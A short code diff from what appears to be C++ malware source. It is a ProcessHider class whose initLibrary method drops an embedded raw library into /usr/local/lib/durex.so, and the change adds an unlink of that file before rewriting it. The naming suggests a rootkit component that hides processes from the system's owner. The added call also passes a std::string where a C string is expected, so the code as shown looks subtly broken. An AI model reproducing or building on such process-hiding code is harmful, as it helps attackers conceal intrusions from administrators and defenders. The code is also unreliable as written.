@@ -9,6 +9,8 @@ void ProcessHider::initLibrary()
 {
 	std::fstream file;
 	std::string filename = "/usr/local/lib/durex.so";
+
+	unlink(filename);
 	file.open(filename.c_str(), std::fstream::in | std::fstream::out | std::fstream::app);
 	if (file.is_open()) {
 		file << this->getRawLibrary();
